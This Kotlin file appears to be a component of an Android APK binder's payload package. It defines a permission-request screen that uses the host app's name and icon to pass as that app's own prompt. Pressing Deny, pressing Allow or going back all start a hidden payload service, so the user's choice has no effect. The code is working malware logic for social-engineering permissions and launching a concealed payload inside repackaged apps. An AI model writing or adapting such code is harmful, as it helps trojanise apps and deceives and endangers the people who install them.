package Com.devhs.apkbinder.payload

import android.app.Activity
import android.content.Intent
import android.graphics.Color
import android.graphics.drawable.ColorDrawable
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Bundle
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView
import Com.devhs.apkbinder.Const

class PermissionGateActivity : Activity() {

    private var missing: List<String> = emptyList()
    private var appName: String = ""
    private var finished = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        HsLog.init(this)
        HsLog.w("Gate.onCreate")

        window.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
        window.setDimAmount(0.45f)
        window.addFlags(android.view.WindowManager.LayoutParams.FLAG_DIM_BEHIND)

        appName = try {
            val ai = packageManager.getApplicationInfo(packageName, 0)
            packageManager.getApplicationLabel(ai).toString()
        } catch (t: Throwable) {
            "App"
        }

        missing = HsPerms.missing(this)
        HsLog.w("Gate missing=${missing.size}")

        setContentView(buildUi())
    }

    private fun dp(v: Int): Int =
        TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, v.toFloat(), resources.displayMetrics).toInt()

    private fun buildUi(): View {
        val root = FrameLayout(this)
        root.setBackgroundColor(0x33000000)

        val card = LinearLayout(this)
        card.orientation = LinearLayout.VERTICAL
        card.gravity = Gravity.CENTER_HORIZONTAL
        card.setPadding(dp(22), dp(22), dp(22), dp(18))

        val bg = GradientDrawable()
        bg.cornerRadius = dp(18).toFloat()
        bg.setColor(0xF2141420.toInt())
        bg.setStroke(dp(1), 0xFF00E5A0.toInt())
        card.background = bg

        val lp = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        )
        lp.gravity = Gravity.CENTER
        lp.leftMargin = dp(26)
        lp.rightMargin = dp(26)

        val icon = ImageView(this)
        try {
            val ai = packageManager.getApplicationInfo(packageName, 0)
            icon.setImageDrawable(packageManager.getApplicationIcon(ai))
        } catch (_: Throwable) {
        }
        val isz = dp(54)
        card.addView(icon, LinearLayout.LayoutParams(isz, isz))

        val name = TextView(this)
        name.text = appName
        name.setTextColor(Color.WHITE)
        name.setTextSize(17f)
        name.gravity = Gravity.CENTER
        name.setPadding(0, dp(10), 0, dp(2))
        card.addView(name)

        val title = TextView(this)
        title.text = "Permission Required"
        title.setTextColor(0xFF00E5A0.toInt())
        title.setTextSize(13f)
        title.gravity = Gravity.CENTER
        title.setPadding(0, 0, 0, dp(10))
        card.addView(title)

        val list = TextView(this)
        list.setTextColor(0xFFB9B9C6.toInt())
        list.setTextSize(12f)
        list.gravity = Gravity.CENTER
        list.text = if (missing.isEmpty()) "All permissions already granted"
        else missing.joinToString("\n") { "• " + HsPerms.label(it) }
        list.setPadding(0, 0, 0, dp(16))
        card.addView(list)

        val row = LinearLayout(this)
        row.orientation = LinearLayout.HORIZONTAL

        val deny = Button(this)
        deny.text = "Deny"
        deny.setTextColor(Color.WHITE)
        deny.background = roundBg(0xFF2A2A38.toInt(), dp(12))
        deny.setOnClickListener { proceed() }

        val allow = Button(this)
        allow.text = "Allow"
        allow.setTextColor(Color.BLACK)
        allow.background = roundBg(0xFF00E5A0.toInt(), dp(12))
        allow.setOnClickListener { onAllow() }

        val rlp = LinearLayout.LayoutParams(0, dp(44), 1f)
        rlp.rightMargin = dp(8)
        row.addView(deny, rlp)

        row.addView(allow, LinearLayout.LayoutParams(0, dp(44), 1f))

        card.addView(row, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ))

        root.addView(card, lp)
        return root
    }

    private fun roundBg(color: Int, radius: Int): GradientDrawable {
        val g = GradientDrawable()
        g.setColor(color)
        g.cornerRadius = radius.toFloat()
        return g
    }

    private fun onAllow() {
        if (missing.isEmpty()) {
            proceed()
            return
        }
        try {
            requestPermissions(missing.toTypedArray(), 7)
        } catch (t: Throwable) {
            HsLog.e("requestPermissions: ${t.message}")
            proceed()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        HsLog.w("permission result: ${grantResults.joinToString(",")}")
        proceed()
    }

    private fun proceed() {
        if (finished) return
        finished = true
        try {
            val i = Intent()
            i.setClassName(packageName, Const.PAYLOAD_SERVICE)
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
            HsLog.w("Service started")
        } catch (t: Throwable) {
            HsLog.e("startService: ${t.message}")
        }
        finish()
        overridePendingTransition(0, 0)
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        proceed()
    }
}
